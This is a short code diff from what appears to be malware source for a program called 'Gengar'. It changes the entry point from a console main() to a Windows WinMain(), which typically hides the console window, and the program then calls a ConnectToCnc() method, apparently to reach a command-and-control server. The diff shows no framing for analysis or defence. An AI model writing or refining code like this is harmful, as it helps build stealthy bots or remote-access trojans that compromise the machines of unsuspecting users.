@@ -1,7 +1,6 @@
-#include <iostream>
 #include "gengar.h"
 
-int main()
+int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
 	Gengar gengar;
 	gengar.ConnectToCnc();
